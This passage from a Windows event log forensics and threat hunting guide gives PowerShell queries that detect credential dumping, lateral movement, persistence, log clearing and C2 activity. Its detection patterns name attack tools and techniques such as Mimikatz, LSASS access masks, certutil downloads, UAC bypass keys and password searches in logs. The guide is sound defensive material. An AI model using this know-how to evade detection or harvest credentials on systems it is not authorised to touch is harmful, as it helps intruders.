# Common failure codes:
# 0xC0000064 = User does not exist
# 0xC000006A = Correct username, wrong password
# 0xC0000234 = Account locked out
# 0xC0000072 = Account disabled
# 0xC000006F = Logon outside allowed hours
# 0xC0000070 = Logon from unauthorized workstation
```

**Event ID 4648 - Explicit Credential Usage**

```powershell
# Detect runas, PsExec, lateral movement
Get-WinEvent -LogName Security -FilterHashtable @{ID=4648} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
        Time = $_.TimeCreated
        SubjectUser = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'SubjectUserName'} | Select-Object -ExpandProperty '#text'
        TargetUser = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetUserName'} | Select-Object -ExpandProperty '#text'
        TargetServer = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetServerName'} | Select-Object -ExpandProperty '#text'
        ProcessName = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'ProcessName'} | Select-Object -ExpandProperty '#text'
    }
}

# Indicates: User A used credentials of User B to access system
```

**Event ID 4672 - Special Privileges Assigned**

```powershell
# Detect admin/privileged logons
Get-WinEvent -LogName Security -FilterHashtable @{ID=4672} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
        Time = $_.TimeCreated
        User = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'SubjectUserName'} | Select-Object -ExpandProperty '#text'
        Privileges = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'PrivilegeList'} | Select-Object -ExpandProperty '#text'
    }
} | Where-Object {$_.Privileges -match "SeDebugPrivilege|SeImpersonatePrivilege"}

# Key privileges:
# SeDebugPrivilege = Debug programs (Mimikatz requirement)
# SeImpersonatePrivilege = Impersonate tokens (Potato attacks)
# SeTcbPrivilege = Act as part of OS
# SeBackupPrivilege = Backup files/directories
# SeRestorePrivilege = Restore files/directories
```

**Event ID 4688 - Process Creation**

```powershell
# Requires "Audit Process Creation" policy enabled
# Detect command execution, malicious processes

Get-WinEvent -LogName Security -FilterHashtable @{ID=4688} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
        Time = $_.TimeCreated
        User = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'SubjectUserName'} | Select-Object -ExpandProperty '#text'
        ProcessName = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'NewProcessName'} | Select-Object -ExpandProperty '#text'
        CommandLine = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'CommandLine'} | Select-Object -ExpandProperty '#text'
        ParentProcess = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'ParentProcessName'} | Select-Object -ExpandProperty '#text'
    }
}

# Search for suspicious commands
Get-WinEvent -LogName Security -FilterHashtable @{ID=4688} | 
Where-Object {$_.Message -match "mimikatz|psexec|procdump|powershell.*downloadstring|certutil.*decode|bitsadmin.*transfer"}
```

**Service Events (System Log)**

**Event ID 7045 - Service Installation**

```powershell
# Detect PsExec, remote service creation
Get-WinEvent -LogName System -FilterHashtable @{ID=7045} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
        Time = $_.TimeCreated
        ServiceName = $xml.Event.EventData.Data[0].'#text'
        ServicePath = $xml.Event.EventData.Data[1].'#text'
        ServiceType = $xml.Event.EventData.Data[2].'#text'
        ServiceAccount = $xml.Event.EventData.Data[4].'#text'
    }
} | Where-Object {$_.ServiceName -match "PSEXE|ADMIN\$|suspicious"}
```

**Event ID 7040 - Service Status Change**

```powershell
# Detect service manipulation (persistence, defense evasion)
Get-WinEvent -LogName System -FilterHashtable @{ID=7040} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
        Time = $_.TimeCreated
        ServiceName = $xml.Event.EventData.Data[0].'#text'
        StatusChange = $xml.Event.EventData.Data[1].'#text'
    }
} | Where-Object {$_.ServiceName -match "WinDefend|MpsSvc|WinRM"}
```

**PowerShell Events**

**Event ID 4103 - Module Logging**

```powershell
# PowerShell module execution tracking
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterHashtable @{ID=4103} | ForEach-Object {
    [PSCustomObject]@{
        Time = $_.TimeCreated
        ContextInfo = $_.Properties[0].Value
        Payload = $_.Properties[1].Value
        CommandName = $_.Properties[2].Value
    }
} | Where-Object {$_.Payload -match "Invoke-Mimikatz|Empire|Covenant|Download"}

# Search for credential dumping modules
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterHashtable @{ID=4103} | 
Where-Object {$_.Message -match "sekurlsa|lsadump|Get-Credential|ConvertTo-SecureString"}
```

**Event ID 4104 - Script Block Logging**

```powershell
# Most detailed PowerShell logging - captures full script content
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterHashtable @{ID=4104} | ForEach-Object {
    [PSCustomObject]@{
        Time = $_.TimeCreated
        ScriptBlock = $_.Properties[2].Value
        Path = $_.Properties[4].Value
    }
}

# Detect obfuscated/encoded commands
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterHashtable @{ID=4104} | 
Where-Object {$_.Message -match "-enc|-encodedcommand|frombase64string|compress|invoke-expression|iex|bypass"}

# Search for common attack patterns
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterHashtable @{ID=4104} | 
Where-Object {$_.Message -match "mimikatz|invoke-shellcode|downloadstring|net\.webclient|invoke-command.*-computername"}

# Export suspicious scripts
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterHashtable @{ID=4104} | 
Where-Object {$_.Message -match "mimikatz"} | 
ForEach-Object {
    $_.Properties[2].Value | Out-File "C:\logs\suspicious_script_$($_.TimeCreated.ToString('yyyyMMdd_HHmmss')).txt"
}
```

**Event ID 400 - PowerShell Engine State**

```powershell
# Tracks PowerShell engine lifecycle (start/stop)
Get-WinEvent -LogName "Windows PowerShell" -FilterHashtable @{ID=400} | ForEach-Object {
    [PSCustomObject]@{
        Time = $_.TimeCreated
        User = $_.UserId
        HostApplication = $_.Properties[2].Value
    }
}

# Detect suspicious host applications
Get-WinEvent -LogName "Windows PowerShell" -FilterHashtable @{ID=400} | 
Where-Object {$_.Message -match "encoded|bypass|hidden|noprofile"}
```

**WinRM/PSRemoting Events**

**Event ID 91 - Shell Creation (WinRM)**

```powershell
# Tracks WinRM shell sessions
Get-WinEvent -LogName "Microsoft-Windows-WinRM/Operational" -FilterHashtable @{ID=91} | ForEach-Object {
    [PSCustomObject]@{
        Time = $_.TimeCreated
        User = $_.UserId
        ClientIP = $_.Properties[0].Value
    }
}
```

**Event ID 169 - User Authentication Success (WinRM)**

```powershell
# Successful WinRM authentication
Get-WinEvent -LogName "Microsoft-Windows-WinRM/Operational" -FilterHashtable @{ID=169} | ForEach-Object {
    [PSCustomObject]@{
        Time = $_.TimeCreated
        User = $_.Properties[0].Value
    }
}
```

### Sysmon Event Analysis

**Sysmon Overview:** Sysmon (System Monitor) is a Windows service that logs detailed system activity including process creation, network connections, file modifications, and registry changes. Must be installed separately and configured.

**Event ID 1 - Process Creation**

```powershell
# Detailed process tracking with command lines and hashes
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=1} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
        Time = $_.TimeCreated
        ProcessGuid = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'ProcessGuid'} | Select-Object -ExpandProperty '#text'
        ProcessId = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'ProcessId'} | Select-Object -ExpandProperty '#text'
        Image = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'Image'} | Select-Object -ExpandProperty '#text'
        CommandLine = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'CommandLine'} | Select-Object -ExpandProperty '#text'
        User = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'User'} | Select-Object -ExpandProperty '#text'
        ParentImage = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'ParentImage'} | Select-Object -ExpandProperty '#text'
        Hashes = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'Hashes'} | Select-Object -ExpandProperty '#text'
    }
}

# Detect suspicious parent-child relationships
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=1} | 
Where-Object {$_.Message -match "ParentImage.*\b(winword|excel|outlook).*CommandLine.*(powershell|cmd|wscript)"}

# Hunt for LOLBins (Living Off The Land Binaries)
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=1} | 
Where-Object {$_.Message -match "certutil.*download|bitsadmin.*transfer|regsvr32.*scrobj|mshta.*http|rundll32.*javascript"}
```

**Event ID 3 - Network Connection**

```powershell
# Track outbound/inbound connections
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=3} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
        Time = $_.TimeCreated
        ProcessId = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'ProcessId'} | Select-Object -ExpandProperty '#text'
        Image = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'Image'} | Select-Object -ExpandProperty '#text'
        User = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'User'} | Select-Object -ExpandProperty '#text'
        Protocol = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'Protocol'} | Select-Object -ExpandProperty '#text'
        SourceIp = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'SourceIp'} | Select-Object -ExpandProperty '#text'
        DestinationIp = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'DestinationIp'} | Select-Object -ExpandProperty '#text'
        DestinationPort = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'DestinationPort'} | Select-Object -ExpandProperty '#text'
    }
}

# Detect C2 beaconing patterns
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=3} | 
Where-Object {$_.Message -match "powershell|rundll32|regsvr32"} | 
Group-Object {$_.Properties[15].Value} | # Group by DestinationIp
Where-Object {$_.Count -gt 10} # Repeated connections

# Uncommon ports for common processes
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=3} | 
Where-Object {$_.Message -match "explorer\.exe|svchost\.exe" -and $_.Message -match "DestinationPort: (4444|8080|8888|31337)"}
```

**Event ID 7 - Image/DLL Load**

```powershell
# Track DLL injection and reflective loading
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=7} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
        Time = $_.TimeCreated
        ProcessId = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'ProcessId'} | Select-Object -ExpandProperty '#text'
        Image = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'Image'} | Select-Object -ExpandProperty '#text'
        ImageLoaded = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'ImageLoaded'} | Select-Object -ExpandProperty '#text'
        Signed = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'Signed'} | Select-Object -ExpandProperty '#text'
    }
}

# Unsigned DLLs loaded by critical processes
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=7} | 
Where-Object {$_.Message -match "Signed: false" -and $_.Message -match "lsass|winlogon|services"}
```

**Event ID 8 - CreateRemoteThread**

```powershell
# Process injection detection
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=8} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
        Time = $_.TimeCreated
        SourceProcessId = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'SourceProcessId'} | Select-Object -ExpandProperty '#text'
        SourceImage = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'SourceImage'} | Select-Object -ExpandProperty '#text'
        TargetProcessId = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetProcessId'} | Select-Object -ExpandProperty '#text'
        TargetImage = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetImage'} | Select-Object -ExpandProperty '#text'
        StartAddress = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'StartAddress'} | Select-Object -ExpandProperty '#text'
    }
}

# Suspicious injections into sensitive processes
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=8} | 
Where-Object {$_.Message -match "TargetImage.*\\(lsass|explorer|winlogon)\.exe"}
```

**Event ID 10 - ProcessAccess**

```powershell
# Detect credential dumping (accessing LSASS)
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=10} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
        Time = $_.TimeCreated
        SourceProcessId = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'SourceProcessId'} | Select-Object -ExpandProperty '#text'
        SourceImage = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'SourceImage'} | Select-Object -ExpandProperty '#text'
        TargetProcessId = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetProcessId'} | Select-Object -ExpandProperty '#text'
        TargetImage = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetImage'} | Select-Object -ExpandProperty '#text'
        GrantedAccess = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'GrantedAccess'} | Select-Object -ExpandProperty '#text'
    }
}

# Mimikatz-style LSASS access
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=10} | 
Where-Object {$_.Message -match "TargetImage.*lsass\.exe" -and $_.Message -match "GrantedAccess: 0x1010|0x1410|0x147a"}
```

**Event ID 11 - FileCreate**

```powershell
# Track file creation for persistence/staging
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=11} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
        Time = $_.TimeCreated
        ProcessId = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'ProcessId'} | Select-Object -ExpandProperty '#text'
        Image = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'Image'} | Select-Object -ExpandProperty '#text'
        TargetFilename = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetFilename'} | Select-Object -ExpandProperty '#text'
    }
}

# Suspicious file locations
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=11} | 
Where-Object {$_.Message -match "TargetFilename.*(\\Users\\Public|\\AppData\\Roaming|\\Temp).*\.(exe|dll|ps1|bat|vbs)"}

# Persistence via Startup folders
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=11} | 
Where-Object {$_.Message -match "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"}
```

**Event ID 13 - RegistryEvent (Value Set)**

```powershell
# Registry persistence and modification detection
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=13} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
        Time = $_.TimeCreated
        ProcessId = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'ProcessId'} | Select-Object -ExpandProperty '#text'
        Image = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'Image'} | Select-Object -ExpandProperty '#text'
        TargetObject = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetObject'} | Select-Object -ExpandProperty '#text'
        Details = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'Details'} | Select-Object -ExpandProperty '#text'
    }
}

# Common persistence registry keys
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=13} | 
Where-Object {$_.Message -match "Run\\|RunOnce\\|CurrentVersion\\Windows\\Load|Winlogon\\Shell|ServiceDll"}

# Detect UAC bypass techniques
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=13} | 
Where-Object {$_.Message -match "mscfile\\shell\\open\\command|ms-settings\\shell\\open\\command"}
```

**Event ID 22 - DNSEvent (DNS Query)**

```powershell
# DNS queries for C2 domains
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=22} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
        Time = $_.TimeCreated
        ProcessId = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'ProcessId'} | Select-Object -ExpandProperty '#text'
        Image = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'Image'} | Select-Object -ExpandProperty '#text'
        QueryName = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'QueryName'} | Select-Object -ExpandProperty '#text'
        QueryResults = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'QueryResults'} | Select-Object -ExpandProperty '#text'
    }
}

# Suspicious domains or TLDs
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=22} | 
Where-Object {$_.Message -match "\.(tk|ml|ga|cf|gq|pw|cc)\b"}

# DNS tunneling detection (long subdomain strings)
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=22} | 
Where-Object {$_.Message -match "QueryName.*[a-f0-9]{32,}"}
```

### Advanced Event Log Analysis

**Timeline Construction**

```powershell
# Create timeline of user activity
$StartTime = (Get-Date).AddHours(-24)
$Events = @()

# Logon events
$Events += Get-WinEvent -LogName Security -FilterHashtable @{ID=4624; StartTime=$StartTime} | Select-Object TimeCreated, @{Name="Type";Expression={"Logon"}}, Message

# Process creation
$Events += Get-WinEvent -LogName Security -FilterHashtable @{ID=4688; StartTime=$StartTime} | Select-Object TimeCreated, @{Name="Type";Expression={"Process"}}, Message

# PowerShell execution
$Events += Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterHashtable @{ID=4104; StartTime=$StartTime} -ErrorAction SilentlyContinue | Select-Object TimeCreated, @{Name="Type";Expression={"PowerShell"}}, Message

# Sort by time
$Events | Sort-Object TimeCreated | Export-Csv -Path timeline.csv -NoTypeInformation
```

**Lateral Movement Detection**

```powershell
# Correlate events indicating lateral movement
$TargetUser = "administrator"
$StartTime = (Get-Date).AddHours(-2)

# Explicit credential usage (Event 4648)
$ExplicitAuth = Get-WinEvent -LogName Security -FilterHashtable @{ID=4648; StartTime=$StartTime} | 
Where-Object {$_.Message -match $TargetUser}

# Network logons (Event 4624, Type 3)
$NetworkLogons = Get-WinEvent -LogName Security -FilterHashtable @{ID=4624; StartTime=$StartTime} | 
Where-Object {$_.Message -match "Logon Type:\s+3" -and $_.Message -match $TargetUser}

# Service installations (Event 7045)
$ServiceInstalls = Get-WinEvent -LogName System -FilterHashtable @{ID=7045; StartTime=$StartTime}

# Combine and analyze
Write-Host "Explicit Auth Events: $($ExplicitAuth.Count)"
Write-Host "Network Logons: $($NetworkLogons.Count)"
Write-Host "Service Installations: $($ServiceInstalls.Count)"

$ExplicitAuth | Select-Object TimeCreated, Message
$NetworkLogons | Select-Object TimeCreated, Message
$ServiceInstalls | Select-Object TimeCreated, Message
```

**Credential Dumping Detection**

```powershell
# Combine multiple indicators
$StartTime = (Get-Date).AddDays(-1)

# LSASS access (Sysmon Event 10)
$LsassAccess = Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterHashtable @{ID=10; StartTime=$StartTime} -ErrorAction SilentlyContinue | 
Where-Object {$_.Message -match "lsass\.exe"}

# Process creation of dumping tools
$SuspiciousProcesses = Get-WinEvent -LogName Security -FilterHashtable @{ID=4688; StartTime=$StartTime} -ErrorAction SilentlyContinue | 
Where-Object {$_.Message -match "mimikatz|procdump|dumpert|nanodump|pypykatz"}

# SeDebugPrivilege usage
$DebugPriv = Get-WinEvent -LogName Security -FilterHashtable @{ID=4672; StartTime=$StartTime} | 
Where-Object {$_.Message -match "SeDebugPrivilege"}

Write-Host "[!] Potential Credential Dumping Detected"
Write-Host "LSASS Access Events: $($LsassAccess.Count)"
Write-Host "Suspicious Processes: $($SuspiciousProcesses.Count)"
Write-Host "SeDebugPrivilege Usage: $($DebugPriv.Count)"
```

**Pass-the-Hash Detection**

```powershell
# Detect unusual NTLM authentication patterns
$StartTime = (Get-Date).AddHours(-24)

# Network logons with NTLM (not Kerberos)
$NTLMLogons = Get-WinEvent -LogName Security -FilterHashtable @{ID=4624; StartTime=$StartTime} | 
ForEach-Object {
    $xml = [xml]$_.ToXml()
    $LogonType = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'LogonType'} | Select-Object -ExpandProperty '#text'
    $AuthPackage = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'AuthenticationPackageName'} | Select-Object -ExpandProperty '#text'
    $SourceIP = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'IpAddress'} | Select-Object -ExpandProperty '#text'
    $User = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetUserName'} | Select-Object -ExpandProperty '#text'
    
    if ($LogonType -eq "3" -and $AuthPackage -eq "NTLM") {
        [PSCustomObject]@{
            Time = $_.TimeCreated
            User = $User
            SourceIP = $SourceIP
        }
    }
}

# Group by user and source IP to find anomalies
$NTLMLogons | Group-Object User, SourceIP | Where-Object {$_.Count -gt 5}
```

### Event Log Forensics Tools

**Chainsaw - Fast Event Log Analysis**

```bash
# Linux tool for parsing EVTX files
# Hunt for specific patterns
chainsaw hunt evtx_files/ -s sigma_rules/ --mapping mappings/sigma-mapping.yml

# Search for specific Event IDs
chainsaw search evtx_files/ -e 4624,4625,4648

# Timeline generation
chainsaw hunt evtx_files/ --from "2024-01-01 00:00:00" --to "2024-01-02 00:00:00"

# Output to CSV
chainsaw search Security.evtx -e 4624 --output csv > logons.csv
```

**EvtxECmd - EVTX Parser**

```bash
# Parse EVTX to CSV (Windows)
EvtxECmd.exe -f Security.evtx --csv output_dir

# Process directory of EVTX files
EvtxECmd.exe -d evtx_directory --csvf output.csv
```

**Hayabusa - Threat Hunting Tool**

```bash
# Fast forensics timeline
hayabusa.exe csv-timeline -d evtx_directory -o timeline.csv

# Detection rules
hayabusa.exe csv-timeline -d evtx_directory -o results.csv -r rules/

# Focus on critical/high alerts
hayabusa.exe csv-timeline -d evtx_directory -o alerts.csv -m critical,high
```

**DeepBlueCLI - PowerShell Threat Hunting**

```powershell
# Automated security log analysis
.\DeepBlue.ps1 -log Security
.\DeepBlue.ps1 -log System

# Analyze EVTX file
.\DeepBlue.ps1 Security.evtx

# Detects:
# - Password spraying
# - Mimikatz usage
# - PSExec
# - Obfuscated commands
# - User creation
```

### Event Log Clearing Detection

**Event ID 1102 - Security Log Cleared**

```powershell
# Detect log tampering
Get-WinEvent -LogName Security -FilterHashtable @{ID=1102} | ForEach-Object {
    [PSCustomObject]@{
        Time = $_.TimeCreated
        User = $_.UserId
        Message = $_.Message
    }
}

# System log cleared (Event ID 104)
Get-WinEvent -LogName System -FilterHashtable @{ID=104}
```

**Log Manipulation Indicators**

```powershell
# Check for gaps in RecordId sequences
$Events = Get-WinEvent -LogName Security -MaxEvents 1000
$RecordIds = $Events | Select-Object -ExpandProperty RecordId | Sort-Object

for ($i = 0; $i -lt $RecordIds.Count - 1; $i++) {
    $gap = $RecordIds[$i+1] - $RecordIds[$i]
    if ($gap -gt 1) {
        Write-Host "[!] Gap detected: Missing $($gap -1) records between $($RecordIds[$i]) and $($RecordIds[$i+1])"
    }
}

# Check log file timestamps
Get-ChildItem C:\Windows\System32\winevt\Logs\*.evtx | 
Select-Object Name, LastWriteTime, Length | 
Where-Object {$_.LastWriteTime -gt (Get-Date).AddHours(-1)}
```

### Event Log Enumeration in CTF Scenarios

**Quick Wins in Event Logs:**

```powershell
# Search for passwords in logs (common CTF flag location)
Get-WinEvent -LogName Security | Where-Object {$_.Message -match "password|pwd|pass|flag|htb\{|thm\{"}

# PowerShell script blocks may contain cleartext credentials
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterHashtable @{ID=4104} | 
Where-Object {$_.Message -match "password|credential|securestring|convertto-securestring"}

# Command-line arguments with credentials
Get-WinEvent -LogName Security -FilterHashtable @{ID=4688} | 
Where-Object {$_.Message -match "password|pwd|-p\s|/p\s"}

# Application logs may contain flags
Get-WinEvent -ListLog * | ForEach-Object {
    Get-WinEvent -LogName $_.LogName -MaxEvents 100 -ErrorAction SilentlyContinue | 
    Where-Object {$_.Message -match "flag|password|secret|key"}
}
```

**Historical Command Execution**

```powershell
# Reconstruct attacker commands from logs
Get-WinEvent -LogName Security -FilterHashtable @{ID=4688} | 
Select-Object TimeCreated, @{Name="CommandLine";Expression={
    $xml = [xml]$_.ToXml()
    $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'CommandLine'} | Select-Object -ExpandProperty '#text'
}} | 
Sort-Object TimeCreated | 
Format-Table -AutoSize

# PowerShell command history
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterHashtable @{ID=4104} | 
Select-Object TimeCreated, @{Name="ScriptBlock";Expression={$_.Properties[2].Value}} | 
Sort-Object TimeCreated
```

### Remote Event Log Collection

**Bulk Log Collection**

```powershell
# Collect logs from multiple systems
$computers = Get-Content targets.txt
$Cred = Get-Credential

foreach ($computer in $computers) {
    Write-Host "[*] Collecting from $computer"
    
    # Export Security log
    Invoke-Command -ComputerName $computer -Credential $Cred -ScriptBlock {
        wevtutil epl Security C:\Windows\Temp\Security.evtx
    }
    
    # Copy to analyst machine
    $Session = New-PSSession -ComputerName $computer -Credential $Cred
    Copy-Item -FromSession $Session -Path C:\Windows\Temp\Security.evtx -Destination "C:\logs\${computer}_Security.evtx"
    Remove-PSSession $Session
    
    Write-Host "[+] Collected from $computer"
}
```

**Centralized Log Analysis**

```powershell
# Analyze multiple collected EVTX files
$LogFiles = Get-ChildItem C:\logs\*.evtx

foreach ($log in $LogFiles) {
    Write-Host "[*] Analyzing $($log.Name)"
    
    # Count Event IDs
    $events = Get-WinEvent -Path $log.FullName
    $events | Group-Object Id | Sort-Object Count -Descending | Select-Object -First 10
    
    # Search for credentials
    $events | Where-Object {$_.Message -match "password|credential"} | 
    Select-Object TimeCreated, Id, Message | 
    Export-Csv "analysis_$($log.BaseName).csv" -NoTypeInformation
}
```

### Event Log Analysis Best Practices

**Analysis Workflow:**

1. **Identify time window** of suspicious activity
2. **Correlate multiple event sources** (Security, System, PowerShell, Sysmon)
3. **Build timelines** of authentication, process creation, network activity
4. **Search for IOCs** (known malicious IPs, file hashes, process names)
5. **Pivot on anomalies** (unusual times, rare processes, privilege escalations)
6. **Document findings** with timestamps and evidence

**Performance Considerations:**

```powershell
# Large log queries can be slow - use filtering
# BAD: Get all events then filter
$events = Get-WinEvent -LogName Security
$filtered = $events | Where-Object {$_.Id -eq 4624}

# GOOD: Filter at query time
$events = Get-WinEvent -LogName Security -FilterHashtable @{ID=4624}

# Use MaxEvents to limit results
Get-WinEvent -LogName Security -MaxEvents 1000 -FilterHashtable @{ID=4624}

# Export to XML for offline analysis
Get-WinEvent -LogName Security -FilterHashtable @{ID=4624,4625,4648} | Export-Clixml events.xml
# Later: Import-Clixml events.xml
```

**Limitations and Caveats:**

- **Event log size limits**: Logs rotate when full, older events lost
- **Disabled logging**: Policies may disable critical logging (Script Block Logging, Command Line auditing)
- **Log clearing**: Attackers may delete logs (Event ID 1102)
- **Insufficient retention**: Default retention periods may be too short
- **Missing Sysmon**: Sysmon provides extensive telemetry but requires installation
- **Performance impact**: Verbose logging (especially Sysmon) can affect system performance
- **Encrypted logs**: [Unverified] Some enterprise solutions may encrypt logs requiring decryption keys

### Event Log Configuration Enumeration

**Audit Policy Discovery**

```powershell
# View current audit policies
auditpol /get /category:*

# Specific subcategories
auditpol /get /subcategory:"Logon"
auditpol /get /subcategory:"Process Creation"
auditpol /get /subcategory:"Credential Validation"

# Export all policies
auditpol /backup /file:audit_policy.csv

# Check if Command Line auditing enabled
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled

# PowerShell logging configuration
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"

# Check PowerShell execution policy
Get-ExecutionPolicy -List
```

**Log Configuration Settings**

```powershell
# Get log sizes and retention settings
Get-WinEvent -ListLog * | Select-Object LogName, MaximumSizeInBytes, RecordCount, IsEnabled | 
Where-Object {$_.IsEnabled} | 
Format-Table -AutoSize

# Specific log configuration
Get-WinEvent -ListLog Security | Format-List *

# Check log file paths
Get-ChildItem C:\Windows\System32\winevt\Logs\ | 
Select-Object Name, Length, LastWriteTime | 
Sort-Object Length -Descending

# Verify log retention mode
wevtutil gli Security | Select-String -Pattern "retention|maxSize"
wevtutil gli System | Select-String -Pattern "retention|maxSize"

# Detect insufficient retention (potential security gap)
Get-WinEvent -ListLog * | Where-Object {$_.RecordCount -eq 0 -and $_.IsEnabled} | 
Select-Object LogName
```

**Sysmon Detection**

```powershell
# Check if Sysmon is installed
Get-Service | Where-Object {$_.Name -match "Sysmon"}

# Sysmon driver detection
Get-WmiObject Win32_SystemDriver | Where-Object {$_.Name -match "Sysmon"}

# Check Sysmon configuration
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SysmonDrv\Parameters"

# Sysmon version
Get-Process | Where-Object {$_.Name -match "Sysmon"} | Select-Object Name, Path, ProductVersion

# Verify Sysmon log exists
